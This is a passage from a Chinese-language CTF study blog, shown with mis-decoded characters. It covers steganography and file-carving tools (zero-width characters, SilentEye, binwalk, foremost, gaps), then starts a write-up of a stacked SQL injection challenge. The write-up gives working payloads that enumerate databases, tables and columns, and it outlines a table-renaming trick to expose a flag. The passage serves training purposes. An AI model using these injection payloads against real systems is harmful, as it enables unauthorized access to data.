<p>è¯´æ˜é‡Œé¢æœ‰å…¶ä»–æˆ‘ä»¬æ— æ³•çœ‹åˆ°çš„å­—ç¬¦å­˜åœ¨</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927160630959.png" alt="image-20220927160630959"></p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>vim</code>è¯»å–ä¸€ä¸‹è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå°±ä¼šå‘ç°é‡Œé¢å¤šäº†å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927160526722.png" alt="image-20220927160526722"></p>
<p>è¿™äº›å°±æ˜¯<code>é›¶å®½å­—ç¬¦</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä»ä¸­è¯»å–ä¿¡æ¯å‘¢</p>
<p>è¿™é‡Œå°±éœ€è¦ä¸‹é¢è¿™ä¸ªç½‘ç«™çš„ï¼Œå¯¹æ–‡æœ¬çš„<code>é›¶å®½å­—ç¬¦åŠ å¯†</code>å’Œ<code>é›¶å®½å­—ç¬¦è§£å¯†</code>åŠŸèƒ½</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">330</span>k.github.io<span class="regexp">/misc_tools/u</span>nicode_steganography.html</span><br></pre></td></tr></table></figure></div>

<p>å…ˆé€‰å¥½å‡ºç°çš„å­—ç¬¦ç±»å‹</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927161233239.png" alt="image-20220927161233239"></p>
<p>ç„¶å</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927161257809.png" alt="image-20220927161257809"></p>
<p>å¾—åˆ°éšè—å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line"><span class="number">86</span>MygAZ<span class="number">2</span>uJi<span class="number">2</span>oCxctsd<span class="number">28</span>LB<span class="symbol">NRXHPLykF5</span>LBz<span class="number">8</span>f<span class="number">1</span>xEikW<span class="symbol">NVpKfpce2</span>CMHvhSJUdk<span class="number">7</span>CHLrEVhGRVQvMwT<span class="number">8</span>r<span class="number">7</span>JUgVWGb<span class="symbol">nzxb</span></span><br></pre></td></tr></table></figure></div>

<p>ç”¨<code>ciphey</code> å¾—åˆ°<code>flag</code></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927161352763.png" alt="image-20220927161352763"></p>
<h2 id="6-éšè—ç§˜å¯†-flag-åˆ°å›¾ç‰‡ã€éŸ³ä¹"><a href="#6-éšè—ç§˜å¯†-flag-åˆ°å›¾ç‰‡ã€éŸ³ä¹" class="headerlink" title="6.éšè—ç§˜å¯†(flag)åˆ°å›¾ç‰‡ã€éŸ³ä¹"></a>6.éšè—ç§˜å¯†(flag)åˆ°å›¾ç‰‡ã€éŸ³ä¹</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p><code>Silenteye</code></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927162235740.png" alt="image-20220927162235740"></p>
<p>æŠŠå›¾ç‰‡æˆ–è€…å£°éŸ³æ‹–å…¥å…¶ä¸­</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927162311232.png" alt="image-20220927162311232"></p>
<p>ç„¶åæ‰§è¡Œ<code>Decode</code></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927162351939.png" alt="image-20220927162351939"></p>
<p>å¾—åˆ°åŠ å¯†ä¿¡æ¯</p>
<p>ç”¨<code>ciphey</code> å¾—åˆ°<code>flag</code></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927162441904.png" alt="image-20220927162441904"></p>
<h2 id="7-å°æ¸¸æˆ"><a href="#7-å°æ¸¸æˆ" class="headerlink" title="7.å°æ¸¸æˆ"></a>7.å°æ¸¸æˆ</h2><h3 id="win10-1"><a href="#win10-1" class="headerlink" title="win10"></a>win10</h3><p><code>CEä¿®æ”¹å™¨ï¼Œæ‡‚å¾—éƒ½æ‡‚</code></p>
<h2 id="8-Javaç±»çš„"><a href="#8-Javaç±»çš„" class="headerlink" title="8.Javaç±»çš„"></a>8.Javaç±»çš„</h2><p>åˆ©ç”¨<code>jd-gui</code>å¯¹javaåæ±‡ç¼–ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä¿¡æ¯</p>
<h2 id="9-äºŒç»´ç "><a href="#9-äºŒç»´ç " class="headerlink" title="9.äºŒç»´ç "></a>9.äºŒç»´ç </h2><h3 id="1ï¼‰ç¼ºå°‘å®šä½ç‚¹"><a href="#1ï¼‰ç¼ºå°‘å®šä½ç‚¹" class="headerlink" title="1ï¼‰ç¼ºå°‘å®šä½ç‚¹"></a>1ï¼‰ç¼ºå°‘å®šä½ç‚¹</h3><p><img src="/2022/09/27/crypto+misc/image-20220927163933448.png" alt="image-20220927163933448"></p>
<p>åˆ©ç”¨<code>ps</code>æŠŠä¸¤è€…æ‹¼æ¥èµ·æ¥å°±å¯ä»¥äº†</p>
<h2 id="10-åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶"><a href="#10-åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶" class="headerlink" title="10.åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶"></a>10.åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶</h2><p><a href="https://blog.csdn.net/qq_43531669/article/details/113732757">åŸæ–‡é“¾æ¥</a></p>
<h3 id="1ï¼‰å›¾ç‰‡åˆ†æ"><a href="#1ï¼‰å›¾ç‰‡åˆ†æ" class="headerlink" title="1ï¼‰å›¾ç‰‡åˆ†æ:"></a>1ï¼‰å›¾ç‰‡åˆ†æ:</h3><p>å¦‚å›¾ä¸ºCTFé¢˜ç›®ä¸­ä¸€ä¸ªéšè—æ–‡ä»¶çš„å›¾ç‰‡</p>
<p>é¦–å…ˆå¯¹å›¾ç‰‡è¿›è¡Œåˆ†æï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸ªå·¥å…·binwalkï¼ˆkaliä¸­æ˜¯è‡ªå¸¦çš„ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½åˆ°windowsä¸­ä½¿ç”¨ï¼‰ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•ï¼šbinwalk + æ–‡ä»¶è·¯å¾„/æ–‡ä»¶å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">binwalk</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œå‘½ä»¤åï¼Œbinwalkå°±ä¼šè‡ªåŠ¨åˆ†æè¿™ä¸ªjpgæ–‡ä»¶ï¼š</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165710470.png" alt="image-20220927165710470"></p>
<p>ä»åˆ†æçš„ç»“æœçœ‹ï¼Œè¿™ä¸ªjpgæ–‡ä»¶éšè—ç€ä¸€ä¸ªzipæ–‡ä»¶ï¼Œä»48221å—åç§»å¼€å§‹å°±æ˜¯zipæ–‡ä»¶ã€‚</p>
<h3 id="2ã€å¦‚ä½•åˆ†ç¦»ï¼š"><a href="#2ã€å¦‚ä½•åˆ†ç¦»ï¼š" class="headerlink" title="2ã€å¦‚ä½•åˆ†ç¦»ï¼š"></a>2ã€å¦‚ä½•åˆ†ç¦»ï¼š</h3><p>åœ¨å¾—åˆ°éšè—ä¿¡æ¯åï¼Œæ”¹å¦‚ä½•æŠŠzipæ–‡ä»¶åˆ†ç¦»å‡ºï¼Œä¸‹é¢ä»‹ç»å‡ ç§æ–¹æ³•ï¼š</p>
<h4 id="2-1ã€binwalk-åˆ†ç¦»ï¼š"><a href="#2-1ã€binwalk-åˆ†ç¦»ï¼š" class="headerlink" title="2.1ã€binwalk åˆ†ç¦»ï¼š"></a>2.1ã€binwalk åˆ†ç¦»ï¼š</h4><p>è¿˜æ˜¯ä½¿ç”¨binwalkå·¥å…·ï¼Œä½¿ç”¨ddå‘½ä»¤åˆ†ç¦»å‡ºéšè—æ–‡ä»¶ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">dd <span class="attribute">if</span>=1.jpg <span class="attribute">of</span>=1.zip <span class="attribute">skip</span>=48221 <span class="attribute">bs</span>=1</span><br></pre></td></tr></table></figure></div>


<p>è§£é‡Šï¼šif æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼Œof æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œskip æŒ‡å®šä»è¾“å…¥æ–‡ä»¶å¼€å¤´è·³è¿‡48221ä¸ªå—åå¼€å§‹å¤åˆ¶ï¼Œbsè®¾<br>ç½®æ¯æ¬¡è¯»å†™å—çš„å¤§å°ä¸º1å­—èŠ‚</p>
<p>æ‰§è¡Œåä¼šå¾—åˆ°ä¸€ä¸ª1.zipæ–‡ä»¶ã€‚</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165740304.png" alt="image-20220927165740304"></p>
<h4 id="2-2ã€foremost-å·¥å…·åˆ†ç¦»ï¼š"><a href="#2-2ã€foremost-å·¥å…·åˆ†ç¦»ï¼š" class="headerlink" title="2.2ã€foremost å·¥å…·åˆ†ç¦»ï¼š"></a>2.2ã€foremost å·¥å…·åˆ†ç¦»ï¼š</h4><p>foremostæ˜¯ä¸€ä¸ªåŸºäºæ–‡ä»¶æ–‡ä»¶å¤´å’Œå°¾éƒ¨ä¿¡æ¯ä»¥åŠæ–‡ä»¶çš„å†…å»ºæ•°æ®ç»“æ„æ¢å¤æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œwinå¯ä»¥ä¸‹è½½ä½¿ç”¨ï¼ŒLinuxå¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤å®‰è£…ä½¿ç”¨ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure></div>


<p>Linuxä¸‹åˆ†ç¦»æ–‡ä»¶çš„å‘½ä»¤ä¸ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">foremost</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure></div>


<p>æ‰§è¡Œå‘½ä»¤åï¼Œforemostä¼šç”Ÿæˆoutputç›®å½•å­˜æ”¾åˆ†ç¦»å‡ºçš„æ–‡ä»¶ã€‚</p>
<p>Winä¸‹æ˜¯æŠŠæ–‡ä»¶ç›´æ¥æ‹–åˆ° foremost.exeä¸Šï¼Œä¹Ÿä¼šç”Ÿæˆoutputç›®å½•å­˜æ”¾åˆ†ç¦»å‡ºçš„æ–‡ä»¶ã€‚</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165802749.png" alt="image-20220927165802749"></p>
<h4 id="2-3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š"><a href="#2-3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š" class="headerlink" title="2.3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š"></a>2.3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š</h4><p>hexç¼–è¾‘å™¨æœ‰å¾ˆå¤šï¼Œwinä¸‹æœ‰ç”¨å¾—è¾ƒå¤šçš„winhexã€UltraEditç­‰ï¼Œlinuxä¸‹æœ‰hexeditorç­‰ã€‚è¿™é‡Œæˆ‘ä»¬ä»¥winhexä¸ºä¾‹æ¥æ‰‹åŠ¨åˆ†ç¦»ã€‚</p>
<p>ä¸€ä¸ªå®Œæ•´çš„ jpg æ–‡ä»¶ç”± FF D8 å¼€å¤´ï¼ŒFF D9ç»“å°¾ï¼Œå›¾ç‰‡æŸ¥çœ‹å™¨ä¼šå¿½ç•¥ FF D9 ä»¥åçš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥åœ¨ jpg æ–‡ä»¶ä¸­åŠ å…¥å…¶ä»–æ–‡ä»¶ã€‚</p>
<p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œ çŸ¥é“å›¾ç‰‡ä¸­éšè—äº†zipæ–‡ä»¶ï¼Œzipæ–‡ä»¶çš„å¼€å¤´16è¿›åˆ¶ä¸º504B0304ï¼Œå…ˆæœç´¢16è¿›åˆ¶æ–‡æœ¬ FFD9ï¼Œç„¶ååé¢è·Ÿç€504B0304ï¼Œäºæ˜¯å°±å¯ä»¥ä» 50 å¼€å§‹ï¼Œå¤åˆ¶åˆ°æœ€åï¼ˆå› ä¸ºè¿™é‡Œåªæœ‰ä¸€ä¸ªzipï¼Œæ‰€ä»¥å¤åˆ¶åˆ°æœ€åï¼‰ï¼Œå¦å­˜ä¸ºæ–°æ–‡ä»¶ï¼Œå°±å¾—åˆ°äº†éšè—çš„å‹ç¼©åŒ…ã€‚</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165829838.png" alt="image-20220927165829838"></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165845340.png" alt="image-20220927165845340"></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165911140.png" alt="image-20220927165911140"></p>
<h4 id="2-4ã€æ”¹åç¼€åï¼š"><a href="#2-4ã€æ”¹åç¼€åï¼š" class="headerlink" title="2.4ã€æ”¹åç¼€åï¼š"></a>2.4ã€æ”¹åç¼€åï¼š</h4><p>åˆ†æçŸ¥é“éšè—æ–‡ä»¶æ˜¯zipåï¼Œæœ‰ä¸€ä¸ªç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯ç›´æ¥æŠŠå›¾ç‰‡çš„åç¼€æ”¹ä¸º.zipï¼Œç„¶åè§£å‹å³å¯ï¼ˆè¿™ç§æ–¹æ³•è™½ç„¶ç®€å•å¿«é€Ÿï¼Œä½†å¦‚æœéšå†™äº†å¤šä¸ªæ–‡ä»¶æ—¶å¯èƒ½ä¼šå¤±è´¥ï¼‰ã€‚</p>
<h2 id="11-å¤šå›¾ç‰‡æ‹¼å›¾"><a href="#11-å¤šå›¾ç‰‡æ‹¼å›¾" class="headerlink" title="11.å¤šå›¾ç‰‡æ‹¼å›¾"></a>11.å¤šå›¾ç‰‡æ‹¼å›¾</h2><p><a href="https://blog.csdn.net/m0_62291930/article/details/124139016">åŸæ–‡é“¾æ¥</a></p>
<p>Misc è‡ªåŠ¨æ‹¼å›¾<br>éœ€è¦ä½¿ç”¨<code>python</code>é—ä¼ ç®—æ³•è„šæœ¬<code>gaps</code>å’Œæ‹¼å›¾è„šæœ¬<code>montage</code></p>
<p>å¼€å§‹æ‹¼å›¾<br>ä»¥ctfä¸­çš„ä¸€é“è®­ç»ƒé¢˜puzzleä¸ºä¾‹</p>
<p>å¦‚æœå›¾ç‰‡ä¸ºç¢ç‰‡çŠ¶ï¼Œæ ¹æ®æ€»æ•°ç¡®å®šæ‹¼å—é•¿å®½æ•°é‡ï¼Œå¹¶ç”¨montageè¿›è¡Œç¬¬ä¸€æ¬¡æ‹¼æ¥</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171241532.png" alt="image-20220927171241532"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#å¦‚å·¦ä¸‹è§’æ‰€ç¤ºï¼Œæ€»æ•°ä¸º256å—ï¼Œå³å›¾ç‰‡ä»¥16Ã—16æ‹†åˆ†è€Œæˆçš„ï¼ˆè¦åœ¨æ‹¼å—ç›®å½•ä¸‹è¿è¡Œå‘½ä»¤ï¼‰ï¼Œ</span></span><br><span class="line"><span class="meta">#*.pngä¸ºæ‹¼å—æ ¼å¼ï¼Œ16Ã—16ä¸ºé•¿å®½æ•°é‡ï¼Œflag.pngä¸ºåˆæˆåçš„å›¾ç‰‡å</span></span><br></pre></td></tr></table></figure>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">montage</span> *.png -tile <span class="number">16</span>x16 -geometry +<span class="number">0</span>+<span class="number">0</span> flag.png   </span><br></pre></td></tr></table></figure></div>



<p>è¿è¡Œååœ¨ç›®å½•ä¸‹å¯æ‰¾åˆ°å¦‚ä¸‹å›¾ç‰‡</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171709538.png" alt="image-20220927171709538"></p>
<p>è¿è¡Œååœ¨ç›®å½•ä¸‹å¯æ‰¾åˆ°å¦‚ä¸‹å›¾ç‰‡</p>
<p><strong>æ¥ç€æœ€å…³é”®çš„ä¸€ç‚¹ï¼Œè°ƒæ•´å›¾ç‰‡é•¿å®½æ¯”ä¸º1ï¼š1ï¼Œå¯ä»¥ç”¨PS-&gt;å›¾åƒå¤§å°ï¼Œä»¥è¾ƒå¤§æ•°å€¼ä¸ºè¾¹é•¿ï¼Œæ‰©å……ä¸ºæ­£æ–¹å½¢ï¼ˆæ–¹ä¾¿åç»­sizeçš„è®¡ç®—ï¼‰ï¼Œå¦åˆ™åæœŸgapsæ— æ³•è·å¾—æœ€ä½³æ•ˆæœ</strong></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171907186.png" alt="image-20220927171907186"></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171924733.png" alt="image-20220927171924733"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨gapsè„šæœ¬å®ç°è‡ªåŠ¨æ‹¼å›¾æ’åº<strong>ï¼ˆé‡ç‚¹ï¼‰</strong></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171940838.png" alt="image-20220927171940838"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ­¤å¤„çš„sizeä¸ºæ­£æ–¹å½¢å°æ‹¼å—çš„è¾¹é•¿åƒç´ ï¼Œç”±äºåˆšåˆšç»è¿‡æ‹‰ä¼¸ï¼Œæ‹¼å—ä»160Ã—100å˜æˆäº†160Ã—160</span></span><br><span class="line"><span class="comment">#æ³¨æ„æ˜¯å°çš„æ­£æ–¹å½¢åƒç´ ï¼Œæ¯”å¦‚æ‹¼æ¥å®Œæˆçš„ä¸º360pxï¼Œè€Œä¸€åˆ—æœ‰12å¼ å›¾ï¼Œé‚£sizeä¸º12px</span></span><br><span class="line">gaps <span class="attribute">--image</span>=flag.png <span class="attribute">--size</span>=160 --save     </span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/09/27/crypto+misc/image-20220927171957840.png" alt="image-20220927171957840"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">è¡¥å……ï¼šgapså„å‚æ•°çš„ä½œç”¨</span><br><span class="line"></span><br><span class="line">â€“<span class="built_in">image</span> æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„</span><br><span class="line">â€“size æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸</span><br><span class="line">â€“generations é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡</span><br><span class="line">â€“population ä¸ªä½“æ•°é‡</span><br><span class="line">â€“<span class="built_in">verbose</span> æ¯ä¸€ä»£è®­ç»ƒç»“æŸåå±•ç¤ºæœ€ä½³ç»“æœ</span><br><span class="line">â€“<span class="built_in">save</span> å°†æ‹¼å›¾è¿˜åŸä¸ºå›¾åƒ</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">æ€»ç»“</span><br><span class="line">æœ€æœ‰æŒ‘æˆ˜æ€§çš„åœ°æ–¹è«è¿‡äºå®‰è£…gapså’Œå¯¹gapså‚æ•°çš„æŠŠæ¡ï¼Œç‰¹åˆ«æ˜¯sizedçš„è®¡ç®—,éœ€è¦å…ˆä½¿å›¾ç‰‡çš„æ‹¼å—æ°å¥½ä¸ºåƒç´ æœ€å¤§çš„ä¸€æ¡è¾¹çš„æ­£æ–¹å½¢ï¼Œ<span class="keyword">size</span>=è¯¥è¾¹é•¿åƒç´ ã€‚å¦å¤–ï¼Œpipå’Œ<span class="keyword">python</span>åº“è¦æå‰å®‰è£…å®Œæ¯•</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>buuctfé¶åœºwp</title>
    <url>/2022/06/21/buuctf-wp/</url>
    <content><![CDATA[<p><u><code>webå„ä¸ªæ–¹é¢é€‰æ‹©äº†ä¸€äº›é¢˜ç›®è¿›è¡Œå­¦ä¹ ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾—ç¬¬ä¸€æ¬¡å°±åº”è¯¥çœ‹é€šå½»ï¼Œä¸åº”è¯¥ç•™æœ‰é—®é¢˜ï¼Œèƒ½å¤Ÿæ˜ç™½åŸç†å’Œä»£ç ä¸­å“ªå‡ºé€ æˆè¿™ä¸ªçš„åŸå› ï¼Œåå¤åš¼å‰©é¥­æ„Ÿè§‰æµªè´¹æ—¶é—´</code></u></p>
<span id="more"></span>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#1-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><h3 id="1ï¼‰é¢˜ç›®æè¿°"><a href="#1ï¼‰é¢˜ç›®æè¿°" class="headerlink" title="1ï¼‰é¢˜ç›®æè¿°"></a>1ï¼‰é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp"><a href="#2ï¼‰wp" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>å› ä¸ºä¹‹å‰æ²¡æœ‰äº†è§£è¿‡å †å æ³¨å…¥ï¼Œè¿™é‡ŒæŒ¨ä¸ªåˆ†æå­¦ä¹ </p>
<p>å…ˆæ¥ç¡®å®šsqlæ³¨å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MATLAB"><figure class="iseeu highlight /matlab"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701113045499.png" alt="image-20220701113045499"></p>
<p>ç„¶åè¯•è¯•æ˜¾ç¤ºæ‰€æœ‰æ•°æ®ï¼Œæ„Ÿè§‰çœ‹ä¸åˆ°ä»€ä¹ˆæ„æ€ï¼Œåé¢ä¸€æ­¥æ­¥åˆ†æ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>;#</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220702105520465.png" alt="image-20220702105520465"></p>
<p>ç„¶ååˆ¤æ–­å­—æ®µ</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113210998.png" alt="image-20220701113210998"></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113228972.png" alt="image-20220701113228972"></p>
<p>åˆ¤æ–­å¤„å­—æ®µæ•°ä¸º2</p>
<p>ç„¶åç”¨<strong>è”åˆæ³¨å…¥</strong></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113604165.png" alt="image-20220701113604165"></p>
<p>å‘ç°selectè¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ï¼Œç”¨å¤§å°å†™ç»•è¿‡ä¹Ÿä¸è¡Œï¼Œæ‰€ä»¥åªèƒ½æ¢ä¸€ç§æ–¹æ³•</p>
<p>å¯ä»¥å…ˆäº†è§£<a href="../../../../2022/05/28/Web-study">å †å æ³¨å…¥</a>çš„æ¦‚å¿µå’Œæ³¨å…¥æ–¹å¼</p>
<h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a><strong>å †å æ³¨å…¥</strong></h4><p>å…ˆæŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“</p>
<p><code>æ³¨ï¼šè¿™é‡Œä»ç„¶è¦æŸ¥è¯¢æ•°æ®ä¸ºå‡ï¼Œæ¯”å¦‚-1ï¼Œä¸ç„¶å°±ä¸ä¼šæ‰§è¡Œåé¢çš„sqlè¯­å¥</code></p>
<p><code>;é—´éš”sqlè¯­å¥</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701224154901.png" alt="image-20220701224154901"></p>
<p>æ ¹æ®é¢˜ç›®åå­—ï¼Œå…ˆè°ƒç”¨supersqliè¿™ä¸ªåº“çš„è¡¨çœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701222551203.png" alt="image-20220701222551203"></p>
<p>çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨ï¼Œå…ˆçœ‹ä¸€ä¸‹çº¯æ•°å­—çš„è¡¨é‡Œçš„å†…å®¹</p>
<p> <strong><u>æ³¨ï¼šå½“çº¯æ•°å­—å­—ç¬¦ä¸²æ˜¯è¡¨åçš„æ—¶å€™éœ€è¦åŠ åå¼•å·`</u></strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> columns from`<span class="number">1919810931114514</span>`;<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701224603433.png" alt="image-20220701224603433"></p>
<p>çœ‹åˆ°flagåœ¨é‡Œé¢ï¼Œå†çœ‹çœ‹wordsé‡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;use supersqli;show columns <span class="keyword">from</span> <span class="built_in">words</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701233450179.png" alt="image-20220701233450179"></p>
<p><code>VARCHAR(M)æ˜¯ä¸€ç§æ¯”CHARæ›´åŠ çµæ´»çš„æ•°æ®ç±»å‹ï¼ŒåŒæ ·ç”¨äºè¡¨ç¤ºå­—ç¬¦æ•°æ®ï¼Œä½†æ˜¯VARCHARå¯ä»¥ä¿å­˜å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²</code></p>
<p>è¿™é‡ŒçŒœæµ‹ï¼Œå› ä¸ºflagæ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥çŒœæµ‹è¾“å…¥æ¡†æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨</p>
<p>åå°sqlè¯­å¥å¯èƒ½ï¼ˆxxä¸ºè¾“å…¥æ¡†çš„å†…å®¹ï¼‰</p>
<p><code>select id,data from words where id=xx</code></p>
<hr>
<p>æ›´æ”¹è¡¨ååˆ—å</p>
<p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p>
<p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p>
<p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p>
<p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p>
